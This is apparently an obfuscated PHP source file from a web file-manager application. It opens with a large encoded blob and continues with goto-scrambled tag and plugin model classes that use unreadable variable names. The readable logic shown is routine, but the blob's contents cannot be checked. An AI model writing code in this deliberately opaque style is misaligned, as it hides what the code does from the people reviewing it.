')."\364\20\3\314\120\160\220\11\305\51\11\256\77\310\222\302\342\163\147\211\226\44\303\326\214\35\355\44\225\211\105\22\362\42\105\74\237\127\166\334\204\76\43\201\317\100\163\63\11\33\12\133\224\14\61\102\31".base64_decode('pNmiq4gTyis8q66+TrAK8Xf6wrFjw9DXaq+f+vCxJvhBWiQ0RYonNFVKoOPYKVI66SbDmtIbCIRF')."\167\121\266\352\15\4\5\7\223\144\23\15\27\170\372\16\110\377\100\57\341\137\121\102\301\121\302\260\73\211\212\124\264\70\253\256\211\32\14\361\347\77\141\337\304\204\327\273\361\261\33\16\153\150\33\207\303"."\x52\x42\xc6\x86\x35\x71\x5\x8b\xe\x4a\x12\x3a\x97\x85\xb5\x93\xc\x20\x50\x53\x76\x3f\x3\x7a\x8e\x76\xbb\xab\x5d\x73\x6a\x66\xce\xc8\x89\xb0\x68\x2d\x4\x46\x6b\xdd\x33\x6\x48\x35\x66\x70\x18\x40\x98\xc9\xe0\xee\x95\xd5\x55"."\x6b\x67\xd7\xb8\x6a\xab\xa3\xf5\x35\x4c\x5\x2c\x4a\xed\xd3\xa2\xd1\x22\x51\xa0\x1a\x5e\xd3\xb4\x8e\xfb\xb1\x8c\xe\xb9\x6a\xa3\xc3\x33\x5\x8d\xb4\x35\x0\xb0\x8e\x1\xc6\x33\xf4\x4c\xd\x79\xd0\x60\x58\x46\x6d\xf5\x50\xd5\xec"."\141\127\355\320\312\150\164\30\6\153\0\254\31\302\243\141\127\155\215\243\175\246\173\100\65\104\174\354\215\173\112\34\322\345\324\102\255\300\56\10\240\134\243\202\255\24\262\306\20\165\162\203\76\300\224\5\27"."\x7c\x66\xae\x20\x90\x2d\x3e\x8b\x13\x95\xdb\x31\x84\x2e\x29\x45\xf6\x66\x2\xc\x52\x3\xb0\x2\x57\xf2\xb7\x2a\xe4\xb2\xa8\x65\xb6\xd4\x49\x1d\x40\x9e\xb3\x58\x65\x5b\xfc\x4\xa\xb5\xd3\xe7\x8\x5\xc5\x44\x37\x9c\x8\x22\xbe"."\xf7\x2\xe3\xc2\x6b\xb3\x42\x5d\x81\x50\x27\x38\x97\x81\x5\x51\x8f\x4c\x44\x5a\x90\x8d\xcc\x14\xde\x88\xb0\x63\x10\xd0\x0\xa1\x4e\xd8\xc7\x24\x3c\x15\x10\x16\xda\x1e\x9b\x6b\x2f\xb2\xd7\x2a\xef\x43\x1c\x6\x84\x4c\xa6\x16\xc2"."\x3\x9f\x42\x9b\x1f\xea\x2f\x85\xeb\x95\x8f\xc7\x49\xf\xc0\x3e\x8e\xd9\x3e\xc8\x4c\xbe\xb3\xc2\x9e\xd5\x6b\x95\x61\xb8\x26\x17\x8d\x52\x39\x2a\x21\x17\xe0\x9d\x4f\x12\x9f\xae\x83\x8e\x27\xdf\x66\xa1\x81\x20\x74\xa8\x7\x39\x41".base64_decode('jB60CiB/vz8W9q/wlSVAv9KVU8B6H/FT8UeA9weQDzsLfKB/SX9gsBJqpC/IZQkhqdPTH4kJG1e8')."\xa3\x1\xfb\x32\xb6\xa5\xa1\x4a\xef\x9\x3d\xd1\xd8\x10\x67\xd3\x8c\xf9\x76\xa3\x2\x3f\x99\x29\x74\xcd\xe7\xae\x1a\x26\x9c\xcc\x6\x80\x6e\x8a\xbc\xdc\xc3\xa\xc9\x86\x4e\x67\x49\x15\x90\xbf\x19\x92\x41\x3c\xea\x11\x93\x1d\x52"."\xc5\x83\x1e\xb6\xeb\x22\xc6\x20\xb6\x33\xcc\xb8\x9a\x97\xa9\x67\xdc\x1c\xfd\x76\x8e\x59\xd4\x41\xa7\x53\xd4\x51\xf\xb2\x7e\xa3\x92\x81\x78\xff\x5d\x60\x97\x88\xc4\xe4\x4c\x7\xa9\x3a\x32\x12\x17\xe\xf6\xf2\x66\x48\x49\x8b\xd1"."\x5e\x8d\xe9\xfd\xa1\xd5\xbc\x42\x11\xf0\x7d\x25\xc1\x58\x5\xee\x64\x3c\x9\xb3\x28\xbe\xdd\x24\x3c\x2f\xf\x62\xdd\xdc\xc5\xab\x60\xea\xe7\xac\x97\x58\x8b\x62\xb8\x64\x1c\x99\x23\x24\x60\x6d\xf3\xa\xe6\x82\x36\x4f\xc\x82\x83"."\130\144\225\36\56\306\231\77\35\233\175\37\165\77\53\211\226\165\324\211\54\54\0\75\75\4\133\140\210\151\240\130\370\272\64\157\231\230\5\175\263\54\13\116\203\6\160\234\225\211\51\6\124\352\32\240\142"."\x57\xa5\x94\xa\x9f\x42\x49\x42\x8f\x26\xe8\x66\x8f\xfa\xc8\x23\x9d\xc4\xfb\xca\xa4\xfd\xdd\xe0\x6c\x24\xce\x56\x44\x2f\xb4\xc4\x7c\x8e\x74\xae\xb3\x41\x12\xc8\xb\xf2\x1e\x81\x22\xf0\x91\x5\xeb\x46\x6e\x10\x9a\xe5\x38\x1a\xf4"."\x20\xa1\xf0\xc1\xe7\x6\x87\xf8\x5d\x24\x36\xb4\xe8\x1\x25\x16\xd3\x5\x63\x34\x25\x49\x87\xe\x3d\x40\x54\x71\x2d\xc1\x40\xf4\x42\xd1\x40\xa5\x74\xdc\x59\x30\xd9\x6b\x71\x17\x6a\x43\x0\x53\xde\x9a\x8e\xbe\x28\x56\x26\x85\x5f".base64_decode('o7K4TbQVouM0r8Kdm6BcvB3c8yoAgb0Peg2Jdwz3iYdfXKL+YT3JpB0c0Riw3K+ei3m2JS78waY0').strrev('MìMÚ fè\'°W]³«/§Ã3rZU]‚%†§FTĞ‹‚y>ñÖ‰#Y9’o ‰âË)@×Wôì')."\35\142\154\15\137\64\20\13\15\20\231\165\34\133\121\21\136\332\314\274\167\322\55\321\170\116\115\110\275\201\156\270\37\367\372\303\113\244\264\142\112\134\20\102\267\33\326\231\217\34\112\240\323\100\112\370\161"."\252\32\203\202\116\164\162\342\264\270\56\142\273\24\321\255\47\54\250\254\140\74\352\142\161\360\330\305\231\144\306\267\66\134\52\70\224\345\20\277\57\344\201\273\34\53\257\100\140\262\377\261\226\63\251\300\13"."\x84\xca\xdf\x2e\x56\xf8\x2e\xc1\xcf\xf2\x43\x17\x21\x83\x9a\x2f\xa9\x86\xca\xd9\x0\xed\xaa\x49\x11\xbf\xac\x2f\x51\x53\x4\x4\xe8\xc8\x8c\x5b\xa4\xb3\x6e\x65\xdf\x29\xb3\x94\xe6\x71\x8c\x43\x5e\x6e\x13\x6c\x72\xf1\x90\x88\x2f"."\30\26\250\23\33\162\65\117\307\237\104\205\133\356\202\56\253\206\42\0\54\357\33\22\374\30\306\302\260\220\277\273\47\362\137\27\247\46\371\133\205\266\312\250\111\52\45\62\277\341\100\66\104\345\141\215\37".base64_decode('SxWgUgPnD36vAz0qxx3RoiCQIx3wWAtVwMGv92PoBplMHVVDxq/E5hPD/IEYflsNR9120TiFDEmR')."\x65\x92\xe0\x22\xc9\x4d\xcf\x23\x99\x1f\x71\x78\x2c\xed\xa3\x8e\x53\x60\x84\xdb\xaa\x72\x4f\xb2\xd4\x9d\x2e\x2c\x80\x7c\x10\xd6\x8\xdb\x2f\xab\x1a\x7a\xf2\x83\xda\xb9\x12\xdb\x7b\xd6\x28\x1c\xb5\xfb\xdf\xcd\x88\x32\x74\x59\x59"."\x50\xc2\x9e\xba\x1c\x90\x4f\xe2\xa6\xfd\xc\x41\x6a\x95\xea\x90\x87\x8\xee\x47\x55\x6a\xa1\xaf\x19\xf0\x4f\xa0\xe7\xe1\x7c\xb9\x82\x69\x31\xc5\xee\x51\xd\xfe\x2a\x9\x12\x31\xf8\x56\xa\xca\x6d\x5a\x6e\xb2\xc\x60\xb1\xf5\xef"."\xa5\xd5\x60\xee\x5c\xa1\x19\x4b\x3e\xa5\x89\xad\x46\xac\xcd\x7\x58\x88\x3\x85\xb0\x89\xb7\x3\x1e\x85\x9b\x41\x44\x48\xbd\x4a\x49\xb1\x66\x9f\xb2\x2c\xc3\xbe\x26\x70\x51\x5\xcc\x7d\x68\x94\xc2\xf5\xa2\x29\x44\x10\x4c\x2c\x5c".base64_decode('FkUEgkVGsoLrf/oLffQwARbWVyiQmFZFyS9lqPaiwQB2EtUVSukwWpbYp3BdOVJXh22NgO7v5Dxj')."\114\160\30\1\22\166\217\4\2\174\62\321\64\201\152\230\47\52\266\75\105\156\147\331\61\65\130\252\43\200\261\245\35\130\330\200\54\201\307\72\46\305\260\350\317\27\325\53\302\54\162\324\44\33\41\361\352"."\336\111\123\241\42\32\145\14\234\152\161\252\100\305\214\333\210\271\261\35\100\10\73\310\164\141\217\43\70\105\7\173\6\346\5\327\202\106\170\5\330\127\115\351\33\207\10\0\330\117\116\61\357\307\17\67\130"."\240\272\260\47\21\75\52\143\37\101\334\47\76\101\7\137\13\142\247\100\244\331\142\221\324\61\23\372\201\273\26\60\121\231\375\270\273\334\221\23\164\340\111\345\11\301\341\55\361\257\345\22\67\15\4\101\152"."\x91\xf8\x0\x5b\x26\x10\x94\xc9\x80\xb8\xe6\x40\x1\x34\x2b\x45\xc9\xb2\x32\xd4\x32\x2b\x11\xa\x23\x39\xf4\x72\x28\xa3\x3e\xd8\xa3\xe4\xc7\xab\xa4\x98\xcc\xd\xe3\xc2\xc3\x9b\xc2\xb3\x35\xb4\x9\x98\xd8\xcb\xbe\x81\x7e\x21\x5f"."\164\340\66\72\30\301\253\106\57\322\353\64\302\130\2\165\300\73\121\360\203\167\21\206\203\277\162\340\300\367\33\310\230\310\116\156\131\356\124\13\364\70\377\76\254\160\104\254\213\105\362\265\13\275\254\323\154".base64_decode('GUL2jo1o5f4tuCOrfDHHfYeBiHUTUNZgoYVFPetAWskO+pyjrTuEOsRMoY1M4LQNWIXe/c7SiYNk')."\x24\xf3\x3\xe9\x9\xfb\x8\xc1\x49\xcd\xe8\x3e\xa8\x32\x9a\x6a\xa1\x4c\xb0\xe9\xe6\x27\xed\xf8\x75\xda\x82\x7d\x8d\x58\x9e\x4b\x36\x34\xce\x5d\x28\x6e\xb3\xf9\xc8\x71\xd7\x43\xe4\x6\x84\x3e\xcb\x4e\x66\x2b\xa3\x5\xc9\x4a\x69"."\x12\x7d\x12\x57\x9c\xdb\x28\xd1\xea\xe7\x99\x3c\x62\x2c\xf0\x76\x1b\xf\xfe\xaf\x26\x84\xa7\x92\x44\x8e\x33\x9\x7\x7f\xac\x64\xa1\xb\x2a\x7d\xe5\xff\xbf\x1e\x38\x4e\xa5\x6e\xe8\x22\x97\xc7\xac\x8e\xed\xc8\xd6\x9a\x27\xb\x72".base64_decode('tbgDAKPhYVPKzATy2Ul7k/FDq/99pamQLFtdl6FULitABkK/TE/D07aVH4sbwtgKZ0KKGYCeDMjI').base64_decode('C9sukGJBE1Z/EGOCD3+PDVaM1mSKfRKdu7w66HUH7jAFkamFZIXXlsXHElBBEcHJZHnRaKNOKklo')."\x16\xa9\x42\x20\x8f\x83\x9e\x6e\xf6\xfe\x5\xbc\x1\xe6\x55\x80\x31\xce\x9b\x4c\x8d\xa7\x98\x9a\xf5\x9\x9e\x0\x3d\xee\x4\xe2\x83\x65\x4f\x0\xe2\xdc\xe4\x4c\x98\x79\x49\x1b\x50\x94\xad\x84\x99\xc\x66\x98\x2a\xc8\xf5\x44\x58"."\xe5\xd2\x1f\x6a\xa8\xe0\xc\x8a\x9c\x25\xf0\x9e\xf2\x30\x89\x43\x7c\x63\x1a\x44\x19\xd5\x91\x55\x85\xcc\x7d\xe4\x85\x1a\x7f\x56\x58\x34\xf8\xfa\xc0\x43\xfd\xd4\x2a\x3\x46\x84\x93\x34\x24\x43\xb3\xc4\x8c\x28\x5e\xc3\x27\xc4\x70"._kodDe('Kf99oYB9C0rE9Y8Hre+Fv713eqyJqjdZYgIiheio0//nlclOZFXzwWZvAIYsYdeoiudnunI3SQNJQA==')."\x8c\x44\xb8\xd4\x8a\xf4\xdf\x85\x7b\x38\x14\x67\xde\x6e\xe9\x53\x70\xf4\x85\x38\x99\x39\xe6\x81\x1e\x8d\xd8\x9e\x14\x9f\xd3\x11\x94\x6c\x96\xaf\x1a\xe2\x13\x3d\xd9\xb8\xac\xbb\x0\x71\x8d\x9a\xd4\x3\x5c\xa5\x88\x28\xb9\x56\xd8"."\6\121\211\204\67\40\257\46\106\53\170\174\202\135\17\225\237\4\206\55\54\163\145\150\234\207\200\325\220\51\55\322\20\332\16\100\21\211\310\271\226\167\121\2\354\236\276\206\170\13\34\136\114\171\1\234\200"."\xf4\xb0\x4f\x64\x3\x16\x50\x19\xf3\x88\x58\x56\xe\xb\x50\xec\x1e\x42\x4\xf0\xcd\x1\x4a\xf\x96\x1c\xd0\x43\x54\x87\x20\x83\x63\x24\x43\xec\x5b\xcb\x19\x65\xb9\x3\xb0\xf2\xdc\x6c\x3a\x8a\x59\xf8\xe2\x81\xe3\xf0\x65\x76\xeb"."\311\200\130\64\276\133\207\73\327\20\334\144\272\154\305\263\371\123\161\316\250\6\76\63\25\167\122\40\44\126\224\116\272\240\256\41\131\300\12\145\53\202\140\47\46\50\151\205\355\154\313\166\216\13\204\167\341".strrev('	Óˆ&¿‰ì]üıü’¬…†L5c*ü?á$ÓIVMo~'."\0".'À<yÈÕ}Â’ó'."\0".'–ÁHjª¥¿')."\xf5\x2\x61\xb6\x4b\x63\x74\x0\xef\x6c\x5\xf5\x1e\xeb\x53\x18\xd0\x7b\xb5\x75\xe\xb4\x55\x42\x4b\x68\xba\x21\xa0\x9\x8f\xbd\x1c\x7\x9d\xfa\xe3\x60\x9f\x9a\xa7\x2f\xb0\x10\xd2\xa6\xd9\xc9\x48\xe0\x58\xa5\xf2\xc1\xc0\x87\x4d"."\313\20\101\151\216\212\220\100\110\226\370\200\242\335\37\336\320\131\366\165\104\355\111\4\11\227\70\320\0\300\352\263\27\45\42\60\175\177\225\224\40\334\75\130\157\201\330\163\362\145\174\253\250\366\12\311\50"."\x17\x7d\xca\xf\xfc\xc2\x57\x32\xfc\xdc\x81\x6\x4a\xc6\x27\xa3\x9e\x92\xcc\x54\x82\xec\xb9\x6\x2c\xa2\xb1\x70\x67\x94\x40\x4\xc9\xb7\x2c\x28\x63\x1c\xd4\x12\xfd\xe3\x29\xa8\xf6\x1c\x66\x46\xd5\x93\x1d\x6a\x3e\x69\xc7\x2f\xe6".strrev('¯•KÁ:ü\\eg³¸|Ç„ƒ’*@İÌÊ€ª\\—dÉ¤€şüK”ó8eX\\n³Š±Tt`ÁÑÊã')."\x31\x10\xb1\x1c\xca\x1f\xfb\xb1\xb7\xb\x4d\x23\x6\x27\xd7\x38\x79\xc1\x2d\x1e\x21\x37\xe\x42\x38\x9\xe6\x31\x11\x17\x5\x5d\x67\xbb\xa0\x46\x21\x77\xa5\x88\xeb\xc8\xb6\x92\xfc\x93\xd6\x37\x89\x18\x1a\x93\xd1\x0\xe\xb2\xc"."\x70\x5a\xa0\x36\x7f\xd3\xf0\x74\x91\xae\xb6\xb6\x24\xb2\x8f\x15\x8a\xaf\xb8\xdd\xb5\x90\x42\xaf\x50\x9c\x78\x6b\x34\x65\x86\x70\xe5\x8f\x70\x7a\xb5\x76\xb1\xf0\x7e\x13\x4f\xa0\x8b\x9a\x66\xe9\x7c\x81\xb7\xb2\x86\x11\xcc\x90\x98"."\150\251\216\175\150\321\136\202\323\45\6\346\320\321\35\116\363\130\223\60\276\142\253\275\230\301\336\62\234\103\57\353\37\222\247\362\247\355\37\240\335\143\277\263\345\205\10\133\231\262\13\345\210\126\41\17\256"."\x51\xc5\x6c\x38\x9\xe6\xe4\x52\x9b\x25\xaf\x31\xae\x9a\x89\x4c\xc5\xbc\x38\x9\xe6\x2d\x4b\xa6\x99\x85\x5d\xb9\x90\xcf\x94\x8b\xc6\x14\xcd\x2b\xef\x3c\x34\x8d\x6c\x5d\x47\x1a\xcc\x9d\xc2\xb\xa8\x53\xf5\x67\x45\xe4\xf2\xcf\x11"."\342\261\143\243\335\164\345\132\124\74\25\230\252\26\25\221\247\254\5\307\266\335\23\127\342\207\64\245\2\7\344\327\272\345\274\226\247\125\270\144\306\145\302\205\70\144\321\303\54\113\26\157\254\53\337\151\207"."\x2a\xce\x62\xc3\x7a\xd9\x6c\x83\x8b\x1d\xc3\x1d\x71\x12\xd7\x9c\xa3\x79\xea\xcb\xa\x64\xe7\x3e\x22\xa1\xfa\xb6\x47\xb7\x77\xe\x95\xed\x6c\x5e\x97\x29\xed\xe5\x8b\x82\xa7\xdf\x8a\x6e\x9b\x1d\x70\xfb\x5b\xbe\xbf\xcc\x52\x4f\x67".base64_decode('olNrvBPRTDUhKLdAoOiXGafTj2T5QRmRBPD9pFfU1X5ry6k77v3Vjk0bdpx72rbzfunYftb12y8/')."\143\373\345\353\267\235\271\141\333\45\33\161\302\366\53\116\176\373\222\163\27\111\333\317\70\1\46\136\364\263\67\357\333\202\377\335\166\335\75\157\155\172\140\307\375\233\60\312\266\133\357\171\353\326\353\167\134"."\260\161\373\351\277\331\176\361\325\333\57\74\375\150\241\123\100\275\165\356\336\321\162\257\132\41\335\305\217\144\143\162\312\342\100\327\342\154\34\313\0\344\224\32\137\46\41\205\47\166\101\1\167\154\16\274\264"."\342\344\260\246\233\320\211\0\130\22\12\350\267\103\63\115\312\251\200\134\215\60\221\244\210\174\24\11\127\351\40\304\157\43\340\40\242\3\162\104\356\210\55\241\40\271\326\202\273\333\260\202\123\21\63\263\104"."\340\301\73\213\204\312\117\330\273\212\266\173\64\16\0\373\322\270\66\101\250\15\75\156\304\353\3\117\310\111\267\330\245\101\376\266\5\41\167\121\61\0\151\350\31\156\234\342\46\332\374\116\124\206\223\74\303".base64_decode('ybT5SPYkmp7My+m3lUCODHkR+A15dOzUH4jEfMv84Ui4LCnoCYcHAyEv1gguS0a5BC2MsqRgT6B/')."\xaa\x34\x5f\x9f\xc7\xdf\x5b\x96\x6\xb5\x32\xa0\x9e\x32\x7d\x29\x16\x27\xf9\x83\xa8\x96\x9e\xde\x5e\xaa\x16\x58\x5e\xb\x7f\xe7\x12\x5e\x13\x74\x7f\xc8\xcf\x85\xb\x19\x2d\x2f\x50\xae\xa0\xb2\x44\x8f\xd1\xc3\x32\x9d\x8f\xe2\xe3"."\50\112\216\35\173\11\105\130\17\41\304\141\66\350\353\305\54\120\50\333\244\10\362\5\324\234\350\47\205\205\250\3\317\176\337\161\234\267\60\201\31\65\110\124\313\342\67\244\56\313\115\252\0\107\223\5\161".base64_decode('OIEIxdUbAYgase3Wx9aB5fe2dI7aL41hKu8c2IZjqTOPES0uXCthhmhhhaIeDA6T5P8HNYrR/xPG').base64_decode('AAA=')."", 10, -8))); goto DîÊÂ‹É‰é; EÉŠÍÏ¾¦Ü: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\146\141\x76"; protected function cacheFunctionAlias($eâÔÚˆ…¬) { $eÁ¹ÚÑ‚ã… =& $_SERVER[í™]; return array($eÁ¹ÚÑ‚ã…[2187] => array($eâÔÚˆ…¬[0], $eÁ¹ÚÑ‚ã…[2188]), $eÁ¹ÚÑ‚ã…[2189] => array($eâÔÚˆ…¬[0], $eÁ¹ÚÑ‚ã…[2190])); } protected function get($bÖ›åŞ•öß) { $Aïø¶îë´œ =& $_SERVER[í™]; $D×º¶´¼Ã» = Model($Aïø¶îë´œ[460])->metaGet($bÖ›åŞ•öß, $Aïø¶îë´œ[2191]); $BĞ¸ëä†•Á = json_decode($D×º¶´¼Ã», !0); return $BĞ¸ëä†•Á ? $BĞ¸ëä†•Á : array($Aïø¶îë´œ[2192] => $Aïø¶îë´œ[83], $Aïø¶îë´œ[354] => array()); } protected function set($b…†‚†¤Ş, $Fó ¯…µ) { $CŒ¾®Ú©¯š =& $_SERVER[í™]; $Fó ¯…µ = $Fó ¯…µ ? $Fó ¯…µ : array($CŒ¾®Ú©¯š[2192] => $CŒ¾®Ú©¯š[83], $CŒ¾®Ú©¯š[354] => array()); Model($CŒ¾®Ú©¯š[460])->metaSet($b…†‚†¤Ş, $CŒ¾®Ú©¯š[2191], json_encode($Fó ¯…µ)); return Model($CŒ¾®Ú©¯š[460])->metaSet($b…†‚†¤Ş, $CŒ¾®Ú©¯š[2191], json_encode($Fó ¯…µ)); } protected function getByTagID($cì£í¹—İ°, $A’•ø¢‹·) { goto E¥¯ê¯øÃÆ; E¥¯ê¯øÃÆ: $e¨—“ñŠå³ =& $_SERVER[í™]; if (!$cì£í¹—İ° || !$A’•ø¢‹·) { return !1; } if (!Model($e¨—“ñŠå³[460])->getInfoSimple($cì£í¹—İ°)) { return !1; } goto AÒ¤ïÙÁ…ô; AÒ¤ïÙÁ…ô: $A±É˜º¦ = $this->get($cì£í¹—İ°); if (!$A±É˜º¦ || !isset($A±É˜º¦[$e¨—“ñŠå³[354]])) { return !1; } $F£‹­ğÄŒ = array_find_by_field($A±É˜º¦[$e¨—“ñŠå³[354]], $e¨—“ñŠå³[367], $A’•ø¢‹·); goto F˜§Ü¶ÜÈ¼; F˜§Ü¶ÜÈ¼: return is_array($F£‹­ğÄŒ) ? $F£‹­ğÄŒ : !1; goto Cé·–ÊÈÆ; Cé·–ÊÈÆ: } public function listSource($E‘–ßİÑ¬Œ, $AùŒ´…èå¾) { goto Dˆ‡œçÉù; B…õª«Ôƒí: $Fê¶êî›ï = array(); foreach ($DäÍÈñ¥° as $bò¶ƒ‰†ÂÌ) { $F—¢šä“É = $bò¶ƒ‰†ÂÌ[$C·“Òà™‚é[75]]; if (!$F—¢šä“É) { continue; } if (!isset($Fê¶êî›ï[$F—¢šä“É])) { $Fê¶êî›ï[$F—¢šä“É] = array(); } $Fê¶êî›ï[$F—¢šä“É][] = $bò¶ƒ‰†ÂÌ[$C·“Òà™‚é[393]]; } $b÷÷¡†ó = array(); goto AÄ”İß¤…ß; C¬²ñÍÅ…Û: if ($D‹§ã ¢°É) { $this->removeBySource($E‘–ßİÑ¬Œ, $D‹§ã ¢°É); } return $Fæ±‚æ–—½; goto d’ğîçº³×; AÄ”İß¤…ß: foreach ($Fê¶êî›ï as $d¶»î”Ó¼ => $CÓÂ¥Ë¶) { $d«’ïÎ›‹ = !0; if (!$AùŒ´…èå¾) { $b÷÷¡†ó[] = $d¶»î”Ó¼; continue; } foreach ($AùŒ´…èå¾ as $A†Ö×¿¯¿) { if (!in_array($A†Ö×¿¯¿, $CÓÂ¥Ë¶)) { $d«’ïÎ›‹ = !1; break; } } if ($d«’ïÎ›‹) { $b÷÷¡†ó[] = $d¶»î”Ó¼; } } if (!$b÷÷¡†ó) { return array(); } $Fæ±‚æ–—½ = Model($C·“Òà™‚é[1103])->listSource(array($C·“Òà™‚é[383] => array($C·“Òà™‚é[384], $b÷÷¡†ó))); goto f ÃÓßèÀ; B„–»†Âù: $D×î®öñ¼Ä = array_to_keyvalue($Fæ±‚æ–—½[$C·“Òà™‚é[73]], $C·“Òà™‚é[33], $C·“Òà™‚é[369]); $a†èôÜ‰ö = array_merge($D×î®öñ¼Ä, $fä«‘Åº¦); foreach ($b÷÷¡†ó as $F—¢šä“É) { if (!in_array($F—¢šä“É, $a†èôÜ‰ö)) { $D‹§ã ¢°É[] = $F—¢šä“É; } } goto C¬²ñÍÅ…Û; Dˆ‡œçÉù: $C·“Òà™‚é =& $_SERVER[í™]; if ($AùŒ´…èå¾ && !is_array($AùŒ´…èå¾)) { $AùŒ´…èå¾ = array($AùŒ´…èå¾); } $DäÍÈñ¥° = $this->listData($E‘–ßİÑ¬Œ); goto B…õª«Ôƒí; f ÃÓßèÀ: if (!$Fæ±‚æ–—½ || count($b÷÷¡†ó) == $Fæ±‚æ–—½[$C·“Òà™‚é[351]][$C·“Òà™‚é[352]]) { return $Fæ±‚æ–—½; } $D‹§ã ¢°É = array(); $fä«‘Åº¦ = array_to_keyvalue($Fæ±‚æ–—½[$C·“Òà™‚é[74]], $C·“Òà™‚é[33], $C·“Òà™‚é[369]); goto B„–»†Âù; d’ğîçº³×: } protected function listData($a¥Á”ÛÙ»Ú) { $bŠÚåÜ¸Á =& $_SERVER[í™]; $cßÖ›¥ä—Ó = array($bŠÚåÜ¸Á[1414] => 0, $bŠÚåÜ¸Á[436] => array($bŠÚåÜ¸Á[2193], 0), $bŠÚåÜ¸Á[388] => $bŠÚåÜ¸Á[2194] . $a¥Á”ÛÙ»Ú); $b¶áªˆÖ® = $bŠÚåÜ¸Á[2195]; $fæÂ¼šƒô­ = $this->field($b¶áªˆÖ®)->where($cßÖ›¥ä—Ó)->order($bŠÚåÜ¸Á[2196])->select(); return $fæÂ¼šƒô­ ? $fæÂ¼šƒô­ : array(); } protected function addToTag($c»İ‘Á¡Ÿ, $FÎÈá¹ˆçµ, $F˜ÒŸÏ˜î”) { $ağÓ‚æÃŸÂ =& $_SERVER[í™]; if (!$this->getByTagID($c»İ‘Á¡Ÿ, $F˜ÒŸÏ˜î”) || !$FÎÈá¹ˆçµ) { return !1; } if (!Model($ağÓ‚æÃŸÂ[734])->pathInfo($FÎÈá¹ˆçµ)) { return !1; } $D§¨º¡ñ“ = array($ağÓ‚æÃŸÂ[1414] => 0, $ağÓ‚æÃŸÂ[436] => $F˜ÒŸÏ˜î”, $ağÓ‚æÃŸÂ[387] => $FÎÈá¹ˆçµ, $ağÓ‚æÃŸÂ[388] => $ağÓ‚æÃŸÂ[2197] . $c»İ‘Á¡Ÿ, $ağÓ‚æÃŸÂ[386] => $ağÓ‚æÃŸÂ[33], $ağÓ‚æÃŸÂ[2098] => 0); if ($this->where($D§¨º¡ñ“)->find()) { return !1; } return $this->add($D§¨º¡ñ“); } protected function removeFromTag($eóøô­¼æ¼, $cÒ¸ø¤ªŞÜ, $d Èƒ»¶) { $Bóñ‚‘ñÔ =& $_SERVER[í™]; if (!$this->getByTagID($eóøô­¼æ¼, $d Èƒ»¶) || !$cÒ¸ø¤ªŞÜ) { return !1; } if (is_array($cÒ¸ø¤ªŞÜ)) { $cÒ¸ø¤ªŞÜ = array($Bóñ‚‘ñÔ[7], $cÒ¸ø¤ªŞÜ); } $fñòŸĞ‡…À = array($Bóñ‚‘ñÔ[1414] => 0, $Bóñ‚‘ñÔ[436] => $d Èƒ»¶, $Bóñ‚‘ñÔ[388] => $Bóñ‚‘ñÔ[2197] . $eóøô­¼æ¼, $Bóñ‚‘ñÔ[387] => $cÒ¸ø¤ªŞÜ); return $this->where($fñòŸĞ‡…À)->delete(); } protected function removeByTag($cÒ¢ìÀÖÁØ, $AÂÛ¸ù‰°‘) { $D«¡µÑ§¾Ä =& $_SERVER[í™]; if (!$this->getByTagID($cÒ¢ìÀÖÁØ, $AÂÛ¸ù‰°‘)) { return !1; } $F…´¼Ê­ç = array($D«¡µÑ§¾Ä[1414] => 0, $D«¡µÑ§¾Ä[436] => $AÂÛ¸ù‰°‘, $D«¡µÑ§¾Ä[388] => $D«¡µÑ§¾Ä[2197] . $cÒ¢ìÀÖÁØ); return $this->where($F…´¼Ê­ç)->delete(); } protected function removeBySource($bâÓƒäµœ®, $b²ëšºª¤–) { $f—‘¾¹»…Î =& $_SERVER[í™]; if (!$bâÓƒäµœ® || !$b²ëšºª¤–) { return !1; } if (is_array($b²ëšºª¤–)) { $b²ëšºª¤– = array($f—‘¾¹»…Î[7], $b²ëšºª¤–); } $a—­Ç§“çí = array($f—‘¾¹»…Î[1414] => 0, $f—‘¾¹»…Î[387] => $b²ëšºª¤–, $f—‘¾¹»…Î[436] => array($f—‘¾¹»…Î[913], 0), $f—‘¾¹»…Î[388] => $f—‘¾¹»…Î[2197] . $bâÓƒäµœ®); return $this->where($a—­Ç§“çí)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\x2e\x70\154\x75\x67\151\156\114\x69\163\x74"; public $field = array("\156\x61\155\x65", "\163\x74\x61\164\165\163", "\x72\x65\x67\151\145\x73\164", "\143\157\x6e\x66\151\x67"); public function loadList($dîÌ°¡î¾ = false) { $còè¦‚ãö‘ = array_to_keyvalue($this->listData(), $_SERVER[í™][28]); if ($dîÌ°¡î¾) { return $còè¦‚ãö‘[$dîÌ°¡î¾]; } return $còè¦‚ãö‘; } public function init() { $d¯é£Â¡› =& $_SERVER[í™]; Hook::trigger($d¯é£Â¡›[2198]); $AƒòÇ–ÑäŸ = $this->loadPluginList(); foreach ($AƒòÇ–ÑäŸ as $e¿Ø‚Ö›äÙ => $DÏñ°ê) { $EÚÌ¦µ†Ë = $this->appAllow($e¿Ø‚Ö›äÙ, $DÏñ°ê); if (!$EÚÌ¦µ†Ë) { continue; } foreach ($DÏñ°ê[$d¯é£Â¡›[2199]] as $e¡î„Û£ => $Dƒ‘„ïß‘†) { Hook::bind($e¡î„Û£, $Dƒ‘„ïß‘†); } } Hook::trigger($d¯é£Â¡›[2200]); Hook::trigger(ACTION); } public function appAllow($CéâàÂĞùš, $F…¿ŸÏóù¶, $f¥Œ—È± = true) { $aêÎà®åÅ¤ =& $_SERVER[í™]; $A½Ô¸¸´æ = PLUGIN_DIR . $CéâàÂĞùš . $aêÎà®åÅ¤[2201]; if (!is_array($F…¿ŸÏóù¶) || !is_array($F…¿ŸÏóù¶[$aêÎà®åÅ¤[2199]]) || !is_file($A½Ô¸¸´æ) || $F…¿ŸÏóù¶[$aêÎà®åÅ¤[671]] != 1) { return !1; } if ($f¥Œ—È± && !Action($aêÎà®åÅ¤[2202])->checkAuth($CéâàÂĞùš)) { return !1; } return !0; } public function unInstall($bâŠªâñÄ) { $Eæ‰—óŞÄ =& $_SERVER[í™]; $a‘ÓÀæš¡À = $this->loadList($bâŠªâñÄ); if (file_exists(PLUGIN_DIR . $bâŠªâñÄ)) { Hook::apply($bâŠªâñÄ . $Eæ‰—óŞÄ[2203]); } $this->remove($a‘ÓÀæš¡À[$Eæ‰—óŞÄ[367]]); } public function changeStatus($D®¹–Å Ê, $C…õ·¶ìæõ) { $D¼éâÜÛ³Â =& $_SERVER[í™]; 